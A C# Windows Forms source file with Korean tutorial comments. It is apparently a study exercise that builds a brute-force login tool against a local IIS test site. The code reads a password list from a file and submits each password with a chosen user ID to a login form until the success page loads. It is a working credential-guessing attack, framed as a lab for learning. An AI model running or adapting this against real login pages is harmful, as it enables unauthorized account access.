using System;
//using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
/*
위와 동일한 프로그램이나 ArrayList를 List로 수정하였다
*/
/*
[웹 자동 로그인]
#개요
 - 과거 아이디와 비밀번호를 알아내기 위해 사용되던 해킹 프로그램을 간략화한 예제
 - 보안에 취약한 예전 홈페이지 해킹에 많이 사용
 - 홈페이지에 아이디를 입력하고 무작위의 비밀번호를 계속 대입하며 비밀번호를 찾는다
   (비밀번호는 프로젝트의 pwdExample 폴더 안에 있다)
   (프로그램 아이콘은 img 폴더 안에 있다)

#과정
 1. 웹서버 구축
 2. 로그인 기능을 가진 간단한 홈페이지 제작
 3. 해킹 프로그램 제작

1. 웹서버 구축 : 로컬 컴퓨터에 웹서버를 간단히 구축하는 방법이다
 a) 제어판에서 [Windows 기능 켜기/끄기] 클릭
 b) 인터넷 정보 서비스에 체크

     ***
    ※[인터넷 정보 서비스]에 +를 눌러 혹시 아래의 항목이 체크되어 있지 않다면 체크한다. 
    [World Wide web] - [응용 프로그램 개발 기능]
     - .NET 확장성 3.5
     - .NET 확장성 4.6
     - ASP
     - ASP.NET 3.5
     - ASP.NET 4.6
     - ISAPI 필터
     - ISAPI 확장

    [웹 관리 도구]
      - ISS 관리 콘솔
     ***
 c) Windows 검색에서 [IIS(인터넷 정보 서비스) 관리자]를 실행한다
 d) 좌측 [연결] 메뉴에서 [사이트] - [Default Web Site]를 클릭한다
    *** 포트 변경하기 ***
 e) 우측 [작업] 메뉴에서 [사이트 편집] - [바인딩...]을 클릭한다
 f) http를 클릭하고 [편집]을 누른다
 g) 80으로 되어 있는 포트를 2014로 바꾸어 준 뒤 [확인] - [닫기]
    ***  홈 디렉토리 변경하기 ***
 h) [IIS(인터넷 정보 서비스) 관리자]의 오른쪽 메뉴에서 [고급 설정...] 클릭
 i) [실제 경로] - [...]을 클린한 뒤 C:\Study\Home 경로(임의 경로)를 선택한다 - [확인]

2. 간단한 로그인 홈페이지 제작
 - login.html : 아이디와 비밀번호를 입력 받아 전송
 - login_ok.asp : 입력된 아이디와 비밀번호의 일치 여부 및 아이디 입력여부를 판단하고 실패하면
        login.html 또는 login_fail.asp 페이지로 이동
        로그인 성공시 아이디 및 비밀번호 출력
 - login_fail.asp : 로그인 인증에 실패 하였을 때 이동되는 페이지, login.html 페이지와 같은 작업 수행
 (※제작한 내용은 ..\CS_SECURE_EXs\WebHome 폴더 안에 있다)
 
 a) 제작한 세개의 웹페이지를 위에 설정한 홈 디렉토리안에 넣는다.
 b) 웹브라우저에서 http://localhost:2014/login.html 로 접속하면 간단한 로그인 기능 홈페이지가 뜬다
 

3. 해킹프로그램 제작
 - tlsbtnPwd_Click(object sender, EventArgs e) : [비밀번호]버튼 이벤트 핸들러, [열기] 대화상자를 호출하여 대입할 비밀번호를
        ArrayList 개체에 저장하는 작업 수행
 - tlsbtnRun_Click(object sender, EventArgs e) : [Run] 버튼 이벤트 핸들러, 외부스레드 생성, 로그인 인증 웹사이트에 비밀번호 대입
 - WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e) : WebBrowser  컨트롤의 문서 다운로드
        작업이 완료되면 발생하는 이벤트 핸들러, 외부 스레드를 컨트롤
 - Form1_FormClosing(object sender, FormClosingEventArgs e) : 폼이 종료될 때 발생하는 이벤트 핸들러, 외부 스레드 종료
*/
namespace mook_BruteForceLogin
{
    public partial class Form1_fix : Form
    {
        //private List<string> listPassword = new List<string>(); //ArrayList는 구세대 제네릭이므로 List 사용
                                                                  //음 아니다 생각해보니 일부러 이렇게 해 놨을수도 있으니 나중에 다 보고 수정해야지
        private List<string> listPassword = new List<string>();
        int status = 3; //비밀번호를 찾는 FindPassword 스레드의 상태를 관리하는 플래그 변수
        Thread FindPassword = null; //외부 스레드로 비밀번호 찾는 작업 수행
        private delegate void FindPASSDelegate(string strText); //델리게이트 클래스의 개체 선언, 외부스레드에서 비밀번호를 찾았을 때
        private FindPASSDelegate FindPASS = null;               //메세지를 나타내기 위한 구문

        public Form1_fix()
        {
            InitializeComponent();
        }

        //파일에 저장된 여러 비밀번호를 가져오는 작업 수행, 여기선 단순히 txt파일에 비밀번확 저장되어 있지만, 실제로는 DBMS, RAW, SQL 등의 DB를 사용하여 비밀번호를 찾는 해킹도구도 있다
        private void tlsbtnPwd_Click(object sender, EventArgs e)
        {
            if(this.ofdFile.ShowDialog() == DialogResult.OK)
            {
                StreamReader sr = File.OpenText(this.ofdFile.FileName); //파일을 읽어 StreamReader 객체에 저장

                while (true)
                {
                    string pass = sr.ReadLine(); //무작위로 작성된 비밀번호를 한줄한줄 읽어
                    if (pass == null)
                        break;
                    listPassword.Add(pass); //컬렉션에 저장
                }
                sr.Close();
            }
            MessageBox.Show("비밀번호 리스트가 설정되었습니다.", "알림", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        //비밀번호 찾기 위한 외부 스레드 생성
        private void tlsbtnRun_Click(object sender, EventArgs e)
        {
            if (listPassword.Count > 0)
            {
                FindPASS = new FindPASSDelegate(MessageView);
                this.tlstxtAddress.Enabled = false;
                this.tlstxtId.Enabled = false;
                FindPassword = new Thread(ThreadFindPwd);
                FindPassword.Start();
            }
            else
            {
                MessageBox.Show("비밀번호 리스트를 설정하세요", "알림", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        //델리게이트에 대입되는 메소드, 외부 스레드에서 비밀번호를 찾으면 메시지 나타냄
        private void MessageView(string strText)
        {
            this.tlstxtAddress.Enabled = true; //비밀번호 찾는 작업이 끝났으므로 입력컨트롤 활성화
            this.tlstxtId.Enabled = true;
            listPassword.Clear(); 
            MessageBox.Show("비밀번호 : " + strText, "알림", MessageBoxButtons.OK, MessageBoxIcon.Information);
            FindPassword.Abort();
        }

        //외부 스레드에서 수행되어 비밀번호를 찾는 작업 수행
        private void ThreadFindPwd()
        {
            foreach(string PWD in listPassword) //반복적으로 웹페이지에 아뒤와 비번을 대입하며 찾는다
            {
                byte[] postData = Encoding.Default.GetBytes("userid=" + this.tlstxtId.Text + "&userpw=" + PWD); //byte 배열로 아이디와 비밀번호 인코딩
                this.WebBrowser.Navigate(this.tlstxtAddress.Text, null, postData, "Content-Type: application/x-www-form-urlencoded"); //url주소와 byte배열의 아뒤 비번을 넣어 이동
                //WebBrower.Navigate() : 지정된 주소로 이동한다
                #region WebBroser.Navigate 메소드 설명
                /*
                #WebBroser.Navigate(urlString, targetFrameName, postData, additionalHeaders) : 지정된 URL로 이동하는 작업 수행
                 - urlString : 로드할 문서의 URL
                 - targetFrameName : 문서를 로드할 프레임의 이름
                 - postData : 양식(폼) 데이터와 같은 HTTP POST 데이터
                 - additionalHeaders : 기본 머리글에 추가할 HTTP 머리글
                */
                #endregion
                bool isBusy = true;
                status = 3;

                while (isBusy) //루프를 반복적으로 실행하면서
                {
                    if(status == 1) //못 찾았을 때 Flag 1
                        isBusy = false;
                    else if(status == 2) //찾았을 때 Flag 2
                    {
                        Invoke(FindPASS, PWD.ToString());
                        return;
                    }
                }
            }
        }

        //접속된 페이지를 가져오는 작업이 완료되면 발생하는 이벤트 제어
        private void WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            //this.WebBrowser.Navigate로 이동하였을 때 
            if (e.Url.ToString() == "http://localhost:2014/login_ok.asp") //페이지가 로그인 화면이면 flag 2
                status = 2;
            else //아니면 flag 1
                status = 1;
        }

        //스레드 종료
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (FindPassword != null)
                FindPassword.Abort();
        }
    }
}
